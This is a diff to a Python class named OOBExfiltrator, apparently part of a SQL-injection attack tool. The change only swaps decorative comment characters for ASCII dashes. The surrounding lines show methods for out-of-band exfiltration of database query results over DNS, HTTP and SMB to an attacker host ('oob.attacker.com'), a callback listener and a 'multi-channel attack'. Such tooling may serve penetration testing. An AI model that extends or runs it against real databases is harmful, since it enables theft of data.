@@ -37,7 +37,7 @@ class OOBExfiltrator:
         rand = ''.join(random.choices(string.ascii_lowercase, k=8))
         return f"{rand}.oob.attacker.com"
 
-    # ── DNS Exfiltration ──────────────────────────────────────────
+    # -- DNS Exfiltration ------------------------------------------
 
     def dns_exfiltrate(self, query_func: Callable, data_query: str,
                        dbms: str, chunk_size: int = 20) -> OOBResult:
@@ -84,7 +84,7 @@ class OOBExfiltrator:
             duration=round(duration, 3)
         )
 
-    # ── HTTP Exfiltration ─────────────────────────────────────────
+    # -- HTTP Exfiltration -----------------------------------------
 
     def http_exfiltrate(self, query_func: Callable, data_query: str,
                         dbms: str, server_url: str = None) -> OOBResult:
@@ -124,7 +124,7 @@ class OOBExfiltrator:
             duration=round(duration, 3)
         )
 
-    # ── SMB Exfiltration ──────────────────────────────────────────
+    # -- SMB Exfiltration ------------------------------------------
 
     def smb_exfiltrate(self, query_func: Callable, data_query: str,
                        dbms: str, share_path: str = None) -> OOBResult:
@@ -160,7 +160,7 @@ class OOBExfiltrator:
             duration=round(duration, 3)
         )
 
-    # ── Callback Listener ─────────────────────────────────────────
+    # -- Callback Listener -----------------------------------------
 
     def start_listener(self, timeout: int = 30):
         """Start HTTP listener for callbacks"""
@@ -227,7 +227,7 @@ class OOBExfiltrator:
 
         return ""
 
-    # ── Multi-Channel Attack ──────────────────────────────────────
+    # -- Multi-Channel Attack --------------------------------------
 
     def exfiltrate_all_channels(self, query_func: Callable, data_query: str,
                                  dbms: str) -> List[OOBResult]:
@@ -238,7 +238,7 @@ class OOBExfiltrator:
         results.append(self.smb_exfiltrate(query_func, data_query, dbms))
         return results
 
-    # ── Channel Detection ─────────────────────────────────────────
+    # -- Channel Detection -----------------------------------------
 
     def detect_available_channels(self, dbms: str) -> List[str]:
         """Detect which OOB channels are available for the DBMS"""
@@ -252,7 +252,7 @@ class OOBExfiltrator:
         }
         return dbms_channels.get(dbms, ["HTTP"])
 
-    # ── Encrypted Exfiltration ────────────────────────────────────
+    # -- Encrypted Exfiltration ------------------------------------
 
     def exfiltrate_encrypted(self, query_func: Callable, data_query: str,
                               dbms: str, secret: str = None) -> OOBResult:
